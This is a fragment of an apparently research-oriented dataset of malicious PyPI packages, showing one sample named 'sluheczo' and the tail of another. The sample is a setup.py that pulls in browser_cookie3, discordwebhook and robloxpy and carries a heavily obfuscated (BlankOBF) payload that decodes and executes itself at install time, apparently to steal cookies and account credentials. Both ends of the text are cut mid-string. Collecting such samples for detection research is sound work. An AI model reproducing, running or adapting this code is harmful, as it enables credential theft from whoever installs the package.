3\\\\x56\\\\x49\\\\x47\\\\72\\\\x54\\\\x49\\\\x49\\\\x3a\\\\x25\\\\x25\\\\x2d\\\\x3e\\\\x36\\\\x51\\\\x21\\\\62\\\\104\\\\x31\\\\x47\\\\x3c\\\\44\\\\x49\\\\x33\\\\54\\\\47\\\\45\\\\x30\\\\x3a\\\\124\\\\111\\\\50\\\\x34\\\\x56\\\\110\\\\125\\\\62\\\\x45\\\\55\\\\x23\\\\66\\\\104\\\\45\\\\x2f\\\\x3a\\\\106\\\\x5d\\\\107\\\\x32\\\\64\\\\55\\\\x2d\\\\x3d\\\\x54\\\\x45\\\\41\\\\12\\\\115\\\\x3c\\\\44\\\\x59\\\\66\\\\60\\\\x54\\\\x25\\\\x54\\\\x32\\\\64\\\\x2d\\\\x43\\\\x3b\\\\x24\\\\125\\\\111\\\\x33\\\\x36\\\\101\\\\x30\\\\73\\\\x26\\\\121\\\\57\\\\65\\\\46\\\\115\\\\x57\\\\x3d\\\\x24\\\\x55\\\\65\\\\x3b\\\\122\\\\115\\\\x31\\\\x35\\\\65\\\\44\\\\x54\\\\x33\\\\126\\\\x49\\\\120\\\\65\\\\x44\\\\111\\\\131\\\\62\\\\66\\\\135\\\\x29\\\\x3b\\\\46\\\\101\\\\x36\\\\65\\\\106\\\\111\\\\x4c\\\\12\\\\115\\\\65\\\\x24\\\\x49\\\\x26\\\\x30\\\\105\\\\x49\\\\x2b\\\\64\\\\127\\\\101\\\\65\\\\65\\\\x24\\\\65\\\\x36\\\\x34\\\\44\\\\x4d\\\\x25\\\\56\\\\65\\\\x3d\\\\51\\\\76\\\\104\\\\111\\\\x27\\\\63\\\\66\\\\111\\\\x32\\\\62\\\\124\\\\x51\\\\x33\\\\x3a\\\\x57\\\\x2d\\\\x2b\\\\x3b\\\\44\\\\x39\\\\x41\\\\64\\\\x44\\\\55\\\\117\\\\x2d\\\\64\\\\x2d\\\\113\\\\54\\\\x26\\\\105\\\\x2d\\\\72\\\\125\\\\x29\\\\x31\\\\x0a\\\\x4d\\\\65\\\\104\\\\x2d\\\\x57\\\\72\\\\x24\\\\x4d\\\\x5a\\\\61\\\\104\\\\x4d\\\\x2b\\\\54\\\\x36\\\\114\\\\113\\\\x32\\\\x43\\\\x25\\\\x58\\\\x33\\\\x55\\\\x35\\\\x59\\\\x3c\\\\127\\\\x25\\\\x2b\\\\61\\\\63\\\\x45\\\\67\\\\65\\\\64\\\\65\\\\120\\\\63\\\\44\\\\x59\\\\44\\\\x3a\\\\x56\\\\135\\\\x2a\\\\61\\\\65\\\\x34\\\\131\\\\x33\\\\x43\\\\45\\\\42\\\\x36\\\\105\\\\x35\\\\112\\\\x30\\\\x44\\\\x4d\\\\63\\\\x0a\\\\115\\\\x35\\\\106\\\\x2d\\\\116\\\\x32\\\\66\\\\105\\\\x58\\\\x38\\\\104\\\\x59\\\\x4a\\\\x32\\\\67\\\\51\\\\54\\\\x2c\\\\x36\\\\x3d\\\\x49\\\\62\\\\67\\\\105\\\\x54\\\\65\\\\x54\\\\x51\\\\113\\\\72\\\\126\\\\111\\\\x2d\\\\x31\\\\46\\\\x51\\\\x30\\\\x36\\\\44\\\\x34\\\\124\\\\x32\\\\125\\\\61\\\\x36\\\\x35\\\\x32\\\\x4d\\\\51\\\\x2c\\\\x34\\\\104\\\\123\\\\66\\\\x25\\\\x2c\\\\120\\\\x2c\\\\104\\\\135\\\\45\\\\x0a\\\\x27\\\\x32\\\\x36\\\\x55\\\\x30\\\\65\\\\46\\\\121\\\\53\\\\63\\\\60\\\\40\\\\40\\\\12\\\\40\\\\x0a\\\\145\\\\x6e\\\\144\\\\12\\\\165')\",\"\",_____.__name__));_______________=_____(_______(\"\\163\\164\\162\\x2e\\x6a\\157\\x69\\156('', \\x5b\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\x5f\\x5f\\137\\137\\x28\\x78\\51\\x20\\x66\\157\\x72\\40\\x78\\40\\151\\x6e\\x20\\x5b\\x5f\\137\\137\\x5f\\x5f\\137\\x5f\\137\\137\\x5f\\137\\137\\137\\137\\x2c\\x5f\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\137\\x5f\\137\\x5f\\137\\137\\x5f\\54\\x5f\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\x2c\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\135\\135)\",\"\", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), \"\\165\\165\"),\"\\x62\\172\\x32\"),____________________)[_____(\"\\106\\141\\x6c\\x73\\x65\")])"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-sluheczo",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='sluheczo', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\x65\\x76\\141\\154\");_______=_____(\"\\x63\\x6f\\155\\x70\\151\\154\\145\");______,____=_____(_______(\"\\137\\137\\x69\\155\\x70\\157\\x72\\164\\137\\137\\x28\\47\\142\\141\\163\\145\\66\\x34\\47\\x29\",\"\",_____.__name__)),_____(_______(\"\\137\\137\\151\\x6d\\x70\\157\\162\\164\\x5f\\137\\50\\x27\\143\\x6f\\144\\x65\\143\\x73\\47\\51\",\"\",_____.__name__));____________________=_____(\"'\\40\\121\\x6b\\x6f\\x6f\\67\\111'\");________,_________,__________,___________=_____(_______(\"\\x65\\x78\\x65\\143\",\"\",_____.__name__)),_____(_______(\"\\163\\x74\\162\\x2e\\145\\156\\x63\\x6f\\x64\\145\",\"\",_____.__name__)),_____(_______(\"\\151\\x73\\x69\\x6e\\x73\\x74\\141\\x6e\\x63\\x65\",\"\",_____.__name__)),_____(_______(\"\\x62\\171\\164\\145\\163\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\40\":\n        ___________=\"\\40\"+___________\n    for _ in range(_____(\"\\x6c\\145\\x6e\\x28\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\51\")):\n        _________+=_____(\"\\x63\\x68\\x72\\x28\\x6f\\162\\144\\50\\x5f\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\x5f\\x5b\\x5f\\x5d\\51\\x5e\\x6f\\162\\x64\\50\\137\\x5f\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\137\\137\\133\\x28\\154\\x65\\x6e\\x28\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\x5f\\137\\x29\\x20\\55\\40\\x54\\x72\\165\\145\\x2a\\62\\51\\40\\53\\x20\\x54\\162\\165\\x65\\135\\x29\\x29\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\x63\\137\\137\\137\\137\\x5f\\137\\137\\137\\137\\137\\x5f\\137\\137\\137\\x5f\\x5f\\66\\x73\\x35\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\137\\x5f\\137\\66\\141\\162\\144\\166\\70'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = _____(_______(\"\\x5f\\x5f\\x5f\\x5f\\56\\x64\\x65\\x63\\157\\144\\x65\\50\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\x5f\\137\\133\\x3a\\55\\x54\\x72\\x75\\x65\\x5d,'\\162\\157\\x74\\61\\63')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\x66\\65\\163\\x66\\163\\x64\\146\\x61\\165\\146\\70\\65'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\x5f\\137\\137\\56\\x64\\145\\143\\x6f\\144\\x65\\x28\\137\\x5f\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\137\\x5f\\137\\137\\x5b\\72\\x2d\\124\\162\\x75\\145\\x5d,'\\165\\165')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\x64\\65\\x73\\146\\x73\\61\\144\\x66\\x66\\x68\\163\\144\\70'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\x5f\\x5f\\x5f\\137\\x2e\\144\\x65\\x63\\x6f\\x64\\x65\\x28\\137\\137\\137\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5b\\x3a\\x2d\\x54\\x72\\x75\\x65\\x5d,'\\x68\\145\\x78')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\137\\137\\x5f\\137\\137\\137\\x2e\\142\\x38\\x35\\144\\x65\\x63\\x6f\\x64\\145\\50\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\133\\x3a\\x2d\\x54\\162\\x75\\x65\\135\\x29\",\"\",_____.__name__));_____________=_____(_______(\"\\x5f\\137\\x5f\\137\\56\\x64\\x65\\143\\x6f\\144\\145\\x28\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\x5f\\137, '\\x68\\145\\170')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\x5f\\137\\137\\137\\x5f\\137\\137\\137\\137\\x5f\\x5f\\x2e\\x64\\145\\143\\157\\x64\\x65\\50\\x5f\\137\\137\\137\\x5f\\137\\137\\x5f\\137\\137\\137\\x5f\\137\\51\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\137\\56\\144\\x65\\143\\157\\x64\\145(b'\\\\x47\\\\53\\\\x7b\\\\x53\\\\66\\\\x47\\\\55\\\\x4e\\\\x59\\\\x34\\\\107\\\\55\\\\x35\\\\x53\\\\60\\\\x48\\\\70\\\\167\\\\x50\\\\65\\\\x47\\\\55\\\\105\\\\x55\\\\x7e\\\\x48\\\\70\\\\x77\\\\117\\\\151\\\\107\\\\55\\\\x57\\\\144\\\\175\\\\107\\\\46\\\\115\\\\x49\\\\x67\\\\107\\\\55\\\\x57\\\\x71\\\\157\\\\110\\\\x44\\\\116\\\\x52\\\\175\\\\x48\\\\x38\\\\x28\\\\x55\\\\146\\\\x47\\\\x63\\\\x2b\\\\x3d\\\\60\\\\x48\\\\70\\\\x56\\\\x33\\\\131\\\\x47\\\\x63\\\\x68\\\\172\\\\131\\\\110\\\\70\\\\103\\\\x5f\\\\x61\\\\110\\\\x23\\\\x61\\\\x76\\\\x6b\\\\107\\\\x2d\\\\x45\\\\131\\\\63\\\\x47\\\\x2d\\\\127\\\\x68\\\\x30\\\\110\\\\x38\\\\103\\\\174\\\\144\\\\110\\\\x23\\\\71\\\\125\\\\x66\\\\110\\\\x38\\\\x4d\\\\60\\\\142\\\\110\\\\x61\\\\x49\\\\x70\\\\152\\\\x48\\\\70\\\\145\\\\x46\\\\x65\\\\x48\\\\x23\\\\71\\\\130\\\\x6c\\\\107\\\\55\\\\127\\\\x6e\\\\160\\\\110\\\\43\\\\71\\\\x55\\\\x63\\\\x47\\\\x2b\\\\x7b\\\\114\\\\176\\\\110\\\\x23\\\\x30\\\\130\\\\x65\\\\x48\\\\x38\\\\167\\\\x56\\\\x35\\\\110\\\\x65\\\\51\\\\161\\\\66\\\\107\\\\x2d\\\\65\\\\120\\\\x30\\\\x47\\\\144\\\\115\\\\x52\\\\x67\\\\107\\\\55\\\\x4e\\\\x68\\\\157\\\\x47\\\\x26\\\\126\\\\x47\\\\x33\\\\110\\\\70\\\\x65\\\\x49\\\\153\\\\x48\\\\132\\\\167\\\\107\\\\x30\\\\x48\\\\x38\\\\x65\\\\106\\\\144\\\\x48\\\\132\\\\167\\\\x4f\\\\153\\\\x48\\\\x38\\\\145\\\\x39\\\\x5a\\\\x48\\\\141\\\\71\\\\x61\\\\x68\\\\x47\\\\x2d\\\\x66\\\\164\\\\160\\\\x48\\\\x23\\\\x61\\\\166\\\\150\\\\x47\\\\x2d\\\\x35\\\\123\\\\x32\\\\x47\\\\53\\\\173\\\\x4d\\\\151\\\\110\\\\x38\\\\77\\\\144\\\\x68\\\\107\\\\x64\\\\126\\\\x52\\\\x65\\\\x48\\\\70\\\\x44\\\\x30\\\\175\\\\107\\\\x63\\\\x60\\\\60\\\\143\\\\110\\\\70\\\\156\\\\120\\\\64\\\\x47\\\\143\\\\131\\\\44\\\\x61\\\\110\\\\70\\\\x44\\\\x33\\\\151\\\\x47\\\\46\\\\167\\\\147\\\\156\\\\110\\\\70\\\\115\\\\x30\\\\142\\\\107\\\\x25\\\\137\\\\x5f\\\\174\\\\x48\\\\70\\\\x65\\\\x4d\\\\x32\\\\x47\\\\x26\\\\126\\\\114\\\\145\\\\x48\\\\x38\\\\x77\\\\x4c\\\\141\\\\x48\\\\x61\\\\x39\\\\x6a\\\\x6d\\\\x47\\\\x26\\\\x77\\\\145\\\\66\\\\107\\\\x2d\\\\116\\\\153\\\\x38\\\\107\\\\x2d\\\\65\\\\x56\\\\x6c\\\\110\\\\x61\\\\x49\\\\156\\\\x35\\\\110\\\\70\\\\x33\\\\x3c\\\\x5a\\\\110\\\\145\\\\x78\\\\161\\\\x31\\\\110\\\\x38\\\\x6e\\\\114\\\\x66\\\\107\\\\x63\\\\x59\\\\44\\\\146\\\\x48\\\\70\\\\x56\\\\x33\\\\x58\\\\110\\\\x65\\\\51\\\\156\\\\66\\\\110\\\\x38\\\\77\\\\x58\\\\x64\\\\x48\\\\x61\\\\111\\\\155\\\\x68\\\\x47\\\\55\\\\x66\\\\x71\\\\x36\\\\x47\\\\x63\\\\55\\\\x33\\\\150\\\\x48\\\\x38\\\\77\\\\144\\\\x68\\\\107\\\\x64\\\\x56\\\\x4f\\\\146\\\\x47\\\\55\\\\x45\\\\x59\\\\60\\\\110\\\\x38\\\\104\\\\63\\\\150\\\\x48\\\\x38\\\\145\\\\x43\\\\x61\\\\x48\\\\41\\\\x77\\\\x37\\\\61\\\\107\\\\55\\\\146\\\\x77\\\\x70\\\\x47\\\\53\\\\x7b\\\\112\\\\152\\\\110\\\\x38\\\\x65\\\\106\\\\x66\\\\x47\\\\46\\\\x56\\\\107\\\\x33\\\\x47\\\\x2d\\\\146\\\\x6a\\\\176\\\\107\\\\x63\\\\140\\\\x30\\\\132\\\\110\\\\70\\\\50\\\\x55\\\\x69\\\\x48\\\\x38\\\\x4d\\\\61\\\\x30\\\\x48\\\\x38\\\\156\\\\x4f\\\\154\\\\x47\\\\143\\\\x59\\\\41\\\\x30\\\\107\\\\55\\\\x35\\\\x56\\\\x36\\\\x48\\\\x38\\\\156\\\\117\\\\x6b\\\\107\\\\55\\\\x4e\\\\130\\\\x7b\\\\x48\\\\132\\\\x77\\\\117\\\\150\\\\107\\\\55\\\\116\\\\153\\\\156\\\\107\\\\46\\\\x56\\\\x47\\\\x35\\\\x48\\\\x38\\\\x28\\\\x55\\\\150\\\\x47\\\\53\\\\x7b\\\\x4a\\\\151\\\\110\\\\70\\\\167\\\\x4f\\\\x67\\\\x47\\\\x2b\\\\x7b\\\\x4d\\\\64\\\\x48\\\\70\\\\126\\\\104\\\\61\\\\107\\\\45\\\\137\\\\x5f\\\\141\\\\110\\\\70\\\\167\\\\x4f\\\\146\\\\110\\\\145\\\\170\\\\156\\\\x6e\\\\x48\\\\x38\\\\x65\\\\112\\\\x33\\\\x48\\\\146\\\\101\\\\77\\\\162\\\\x47\\\\55\\\\116\\\\142\\\\x31\\\\107\\\\x26\\\\115\\\\x36\\\\x63\\\\x48\\\\x38\\\\x77\\\\x4f\\\\147\\\\x48\\\\146\\\\x41\\\\x3f\\\\70\\\\x47\\\\x2d\\\\146\\\\164\\\\x41\\\\x48\\\\x65\\\\x78\\\\156\\\\156\\\\110\\\\70\\\\145\\\\112\\\\x31\\\\x47\\\\x2b\\\\173\\\\x4a\\\\152\\\\107\\\\53\\\\173\\\\112\\\\60\\\\107\\\\55\\\\116\\\\x6b\\\\60\\\\107\\\\x26\\\\167\\\\x61\\\\150\\\\107\\\\x2b\\\\x7b\\\\120\\\\x32\\\\x47\\\\53\\\\173\\\\106\\\\x5e\\\\x48\\\\70\\\\x44\\\\63\\\\x65\\\\107\\\\46\\\\64\\\\64\\\\60\\\\107\\\\x63\\\\131\\\\161\\\\x54\\\\x48\\\\x38\\\\126\\\\66\\\\x62\\\\107\\\\x25\\\\x5f\\\\77\\\\175\\\\x47\\\\x2d\\\\116\\\\x62\\\\x33\\\\x47\\\\x64\\\\115\\\\x53\\\\x34\\\\x47\\\\x2d\\\\x45\\\\142\\\\154\\\\x47\\\\53\\\\173\\\\x4d\\\\x69\\\\110\\\\x38\\\\x56\\\\x33\\\\x59\\\\107\\\\x26\\\\x4d\\\\111\\\\144\\\\110\\\\x38\\\\115\\\\63\\\\142\\\\107\\\\46\\\\x77\\\\147\\\\x6b\\\\107\\\\x2d\\\\x4e\\\\x6b\\\\x39\\\\110\\\\x23\\\\141\\\\x76\\\\x6a\\\\107\\\\55\\\\x35\\\\x4f\\\\175\\\\110\\\\x66\\\\101\\\\74\\\\x76\\\\x47\\\\53\\\\x7b\\\\111\\\\174\\\\110\\\\71\\\\x30\\\\142\\\\63\\\\x48\\\\x38\\\\114\\\\x7c\\\\x58\\\\110\\\\41\\\\x77\\\\x39\\\\x65\\\\110\\\\70\\\\126\\\\71\\\\145\\\\x48\\\\43\\\\152\\\\166\\\\x70\\\\x48\\\\x38\\\\156\\\\x53\\\\63\\\\x48\\\\x38\\\\115\\\\63\\\\x67\\\\x48\\\\70\\\\50\\\\125\\\\150\\\\107\\\\46\\\\167\\\\145\\\\70\\\\107\\\\46\\\\x77\\\\141\\\\151\\\\x48\\\\43\\\\x61\\\\x76\\\\x68\\\\107\\\\x2d\\\\x35\\\\126\\\\x6b\\\\x48\\\\x38\\\\156\\\\106\\\\147\\\\110\\\\x38\\\\156\\\\111\\\\x67\\\\x47\\\\53\\\\x7b\\\\x4a\\\\153\\\\x47\\\\x2d\\\\x66\\\\156\\\\65\\\\107\\\\143\\\\55\\\\63\\\\147\\\\x48\\\\x38\\\\167\\\\x52\\\\151\\\\110\\\\70\\\\x4d\\\\x36\\\\x66\\\\110\\\\70\\\\50\\\\122\\\\x62\\\\107\\\\x2d\\\\116\\\\x68\\\\155\\\\x48\\\\70\\\\x65\\\\106\\\\145\\\\110\\\\x23\\\\x39\\\\130\\\\146\\\\x47\\\\53\\\\x7b\\\\x4c\\\\x7e\\\\107\\\\x26\\\\x4d\\\\x41\\\\x30\\\\x48\\\\x38\\\\145\\\\106\\\\146\\\\110\\\\x61\\\\x49\\\\152\\\\x6e\\\\110\\\\x38\\\\x43\\\\137\\\\142\\\\x47\\\\46\\\\x56\\\\x49\\\\x63\\\\110\\\\x38\\\\50\\\\125\\\\151\\\\x48\\\\70\\\\x4d\\\\x30\\\\175\\\\110\\\\x38\\\\126\\\\x43\\\\x6a\\\\x48\\\\43\\\\152\\\\166\\\\154\\\\x48\\\\70\\\\x4d\\\\x37\\\\x31\\\\110\\\\41\\\\167\\\\103\\\\142\\\\110\\\\x38\\\\145\\\\112\\\\62\\\\110\\\\x21\\\\167\\\\66\\\\175\\\\x48\\\\x38\\\\x43\\\\174\\\\x63\\\\110\\\\x65\\\\x78\\\\161\\\\62\\\\110\\\\x38\\\\x33\\\\x5f\\\\x67\\\\110\\\\x38\\\\x6e\\\\106\\\\145\\\\107\\\\55\\\\146\\\\x74\\\\x6f\\\\x47\\\\x2d\\\\x4e\\\\x6b\\\\60\\\\x47\\\\55\\\\65\\\\126\\\\66\\\\110\\\\x61\\\\71\\\\x6b\\\\101\\\\x47\\\\46\\\\167\\\\x61\\\\152\\\\x48\\\\146\\\\101\\\\x3c\\\\x74\\\\110\\\\x38\\\\103\\\\x7c\\\\143\\\\110\\\\70\\\\x4d\\\\63\\\\143\\\\107\\\\55\\\\146\\\\x71\\\\x33\\\\110\\\\43\\\\x30\\\\130\\\\144\\\\110\\\\x38\\\\x33\\\\x5f\\\\147\\\\x47\\\\x25\\\\x2b\\\\x3f\\\\174\\\\x47\\\\46\\\\x77\\\\150\\\\66\\\\110\\\\x38\\\\104\\\\x33\\\\176\\\\107\\\\x2d\\\\116\\\\x65\\\\x31\\\\x48\\\\70\\\\167\\\\x52\\\\x66\\\\x48\\\\70\\\\x77\\\\x4f\\\\147\\\\107\\\\x2b\\\\x7b\\\\x4a\\\\63\\\\x47\\\\55\\\\x35\\\\x4f\\\\x7d\\\\110\\\\146\\\\101\\\\77\\\\66\\\\107\\\\x2d\\\\x4e\\\\153\\\\156\\\\x48\\\\70\\\\x44\\\\63\\\\150\\\\x47\\\\x2d\\\\x4e\\\\x62\\\\62\\\\110\\\\70\\\\x6e\\\\x52\\\\144\\\\107\\\\53\\\\173\\\\x50\\\\x33\\\\110\\\\146\\\\101\\\\44\\\\61\\\\110\\\\70\\\\126\\\\71\\\\x63\\\\110\\\\x65\\\\x78\\\\x64\\\\x7c\\\\x47\\\\x2d\\\\116\\\\x6b\\\\x6e\\\\x48\\\\43\\\\60\\\\126\\\\x37\\\\x48\\\\x38\\\\167\\\\117\\\\x65\\\\x47\\\\53\\\\173\\\\x4d\\\\62\\\\x48\\\\70\\\\156\\\\114\\\\x65\\\\x48\\\\145\\\\x78\\\\x6e\\\\x70\\\\110\\\\70\\\\x33\\\\174\\\\x7d\\\\110\\\\141\\\\x39\\\\x61\\\\146\\\\x48\\\\70\\\\63\\\\74\\\\141\\\\x48\\\\70\\\\103\\\\x3f\\\\x56\\\\x48\\\\70\\\\50\\\\125\\\\x67\\\\110\\\\70\\\\x44\\\\63\\\\x5a\\\\x47\\\\46\\\\x77\\\\130\\\\147\\\\x48\\\\x23\\\\71\\\\x61\\\\x69\\\\110\\\\70\\\\x28\\\\x58\\\\147\\\\x48\\\\43\\\\60\\\\x58\\\\152\\\\107\\\\x26\\\\167\\\\130\\\\145\\\\x48\\\\146\\\\x41\\\\x3c\\\\101\\\\107\\\\46\\\\x34\\\\x34\\\\x32\\\\110\\\\x38\\\\x77\\\\130\\\\152\\\\x48\\\\104\\\\x4e\\\\122\\\\x7b\\\\110\\\\x66\\\\101\\\\x24\\\\161\\\\x78')\",\"\",_____.__name__));________________ = _____(_______(\"\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\x2e\\144\\145\\x63\\x6f\\x64\\145(b'\\\\x56\\\\x6d\\\\65\\\\x53\\\\112\\\\x51\\\\132\\\\x74\\\\x49\\\\x52\\\\x56\\\\145\\\\x45\\\\x79\\\\x34\\\\144\\\\x57\\\\x78\\\\165\\\\122\\\\127\\\\60\\\\105\\\\x4a\\\\x5a\\\\166\\\\x6b\\\\x4b\\\\x42\\\\155\\\\x31\\\\102\\\\x46\\\\x6d\\\\x79\\\\x43\\\\x49\\\\154\\\\114\\\\x78\\\\111\\\\61\\\\x62\\\\66\\\\110\\\\155\\\\x5a\\\\70\\\\x44\\\\x6c\\\\x5a\\\\x33\\\\103\\\\155\\\\x4f\\\\124\\\\x5a\\\\x49\\\\x75\\\\122\\\\x49\\\\x47\\\\x78\\\\60\\\\126\\\\152\\\\143\\\\x41\\\\x57\\\\x53\\\\x52\\\\x74\\\\x46\\\\x53\\\\164\\\\x79\\\\x45\\\\x46\\\\x63\\\\130\\\\112\\\\167\\\\170\\\\x76\\\\x5a\\\\x51\\\\x4f\\\\x6f\\\\106\\\\110\\\\170\\\\x78\\\\126\\\\x46\\\\114\\\\152\\\\x41\\\\x6c\\\\123\\\\x55\\\\126\\\\111\\\\x4d\\\\x54\\\\x5a\\\\60\\\\105\\\\x72\\\\x43\\\\106\\\\114\\\\60\\\\110\\\\x78\\\\110\\\\53\\\\130\\\\x76\\\\x4d\\\\x59\\\\x43\\\\x78\\\\x6a\\\\x63\\\\132\\\\122\\\\x62\\\\x62\\\\x58\\\\122\\\\x34\\\\x7a\\\\131\\\\x46\\\\x75\\\\x50\\\\130\\\\170\\\\x79\\\\x53\\\\x44\\\\x52\\\\x78\\\\71\\\\x49\\\\x77\\\\x4c\\\\x35\\\\120\\\\x78\\\\61\\\\x52\\\\101\\\\121\\\\x63\\\\105\\\\126\\\\x52\\\\x4f\\\\130\\\\x49\\\\x52\\\\143\\\\x4f\\\\105\\\\x46\\\\x74\\\\141\\\\126\\\\155\\\\171\\\\x46\\\\102\\\\x6d\\\\61\\\\x54\\\\x4a\\\\x51\\\\104\\\\60\\\\101\\\\x52\\\\x6a\\\\x39\\\\106\\\\x76\\\\x4e\\\\x32\\\\x42\\\\122\\\\171\\\\116\\\\x44\\\\170\\\\143\\\\x70\\\\x42\\\\121\\\\160\\\\170\\\\x5a\\\\120\\\\122\\\\x78\\\\127\\\\120\\\\143\\\\x51\\\\102\\\\x51\\\\122\\\\142\\\\105\\\\x51\\\\x66\\\\x68\\\\110\\\\170\\\\127\\\\130\\\\127\\\\106\\\\153\\\\x46\\\\106\\\\123\\\\x56\\\\142\\\\x57\\\\x48\\\\114\\\\x58\\\\107\\\\107\\\\x74\\\\64\\\\x56\\\\x78\\\\x57\\\\120\\\\x58\\\\x48\\\\152\\\\62\\\\x56\\\\123\\\\x4e\\\\x39\\\\126\\\\x78\\\\116\\\\172\\\\131\\\\111\\\\x67\\\\104\\\\102\\\\x51\\\\x49\\\\x4d\\\\x41\\\\x47\\\\65\\\\x45\\\\x49\\\\x30\\\\x4f\\\\x52\\\\x47\\\\154\\\\153\\\\110\\\\132\\\\171\\\\x49\\\\120\\\\112\\\\111\\\\164\\\\166\\\\x56\\\\120\\\\x67\\\\x72\\\\x56\\\\x48\\\\x6a\\\\67\\\\x58\\\\60\\\\x5a\\\\x62\\\\127\\\\170\\\\71\\\\x53\\\\x46\\\\x76\\\\x45\\\\127\\\\126\\\\154\\\\x49\\\\160\\\\x43\\\\x31\\\\110\\\\170\\\\x45\\\\x53\\\\x56\\\\x39\\\\111\\\\x74\\\\143\\\\x41\\\\105\\\\x53\\\\x34\\\\165\\\\110\\\\x53\\\\x63\\\\x4d\\\\x41\\\\x52\\\\71\\\\x48\\\\104\\\\121\\\\x30\\\\60\\\\101\\\\106\\\\171\\\\x41\\\\x42\\\\120\\\\x56\\\\x6d\\\\107\\\\x47\\\\x71\\\\126\\\\106\\\\106\\\\143\\\\x45\\\\130\\\\x47\\\\142\\\\x64\\\\132\\\\171\\\\x5a\\\\x38\\\\x43\\\\x51\\\\x56\\\\x31\\\\x59\\\\107\\\\x70\\\\x35\\\\x47\\\\x30\\\\x49\\\\116\\\\107\\\\x46\\\\147\\\\x70\\\\131\\\\x30\\\\x41\\\\101\\\\111\\\\122\\\\x6a\\\\57\\\\x58\\\\x6c\\\\x71\\\\x70\\\\x4a\\\\123\\\\61\\\\x70\\\\x46\\\\x48\\\\161\\\\131\\\\110\\\\171\\\\x5a\\\\151\\\\x50\\\\x78\\\\x31\\\\x71\\\\126\\\\167\\\\x5a\\\\x31\\\\x4a\\\\167\\\\x4c\\\\x67\\\\126\\\\171\\\\160\\\\60\\\\105\\\\x52\\\\x38\\\\x7a\\\\x56\\\\107\\\\x31\\\\x6f\\\\106\\\\x6c\\\\152\\\\x7a\\\\x45\\\\107\\\\126\\\\150\\\\x57\\\\x78\\\\132\\\\151\\\\102\\\\x51\\\\147\\\\x4f\\\\107\\\\x53\\\\132\\\\61\\\\x41\\\\x78\\\\126\\\\147\\\\101\\\\x79\\\\x56\\\\71\\\\x58\\\\x46\\\\x35\\\\127\\\\162')\",\"\",_____.__name__));__________________=_____(_______(\"\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\56\\144\\x65\\143\\x6f\\x64\\145(b'\\\\65\\\\65\\\\64\\\\x35\\\\x33\\\\x30\\\\x33\\\\x33\\\\x34\\\\145\\\\66\\\\141\\\\x34\\\\x39\\\\x37\\\\x30\\\\64\\\\x62\\\\x33\\\\61\\\\67\\\\63\\\\63\\\\x38\\\\64\\\\x63\\\\x37\\\\x61\\\\x37\\\\70\\\\x34\\\\71\\\\65\\\\x38\\\\65\\\\64\\\\66\\\\64\\\\64\\\\62\\\\64\\\\144\\\\x35\\\\64\\\\66\\\\x63\\\\64\\\\71\\\\x34\\\\145\\\\x36\\\\x62\\\\66\\\\146\\\\x34\\\\x62\\\\x35\\\\x34\\\\65\\\\x35\\\\66\\\\70\\\\x34\\\\x66\\\\65\\\\x36\\\\63\\\\x30\\\\x34\\\\144\\\\67\\\\x32\\\\65\\\\61\\\\64\\\\x35\\\\x34\\\\x39\\\\67\\\\x38\\\\64\\\\x39\\\\x34\\\\x36\\\\x37\\\\70\\\\65\\\\60\\\\65\\\\x33\\\\x35\\\\65\\\\x37\\\\x37\\\\x36\\\\144\\\\64\\\\x65\\\\x34\\\\65\\\\x35\\\\x32\\\\65\\\\60\\\\x34\\\\x64\\\\64\\\\x33\\\\64\\\\x64\\\\67\\\\63\\\\65\\\\65\\\\x35\\\\64\\\\66\\\\70\\\\64\\\\65\\\\65\\\\64\\\\64\\\\66\\\\64\\\\66\\\\64\\\\x37\\\\x35\\\\x35\\\\67\\\\141\\\\63\\\\x31\\\\64\\\\62\\\\x35\\\\62\\\\x34\\\\x34\\\\67\\\\x37\\\\x33\\\\71\\\\x34\\\\x62\\\\x3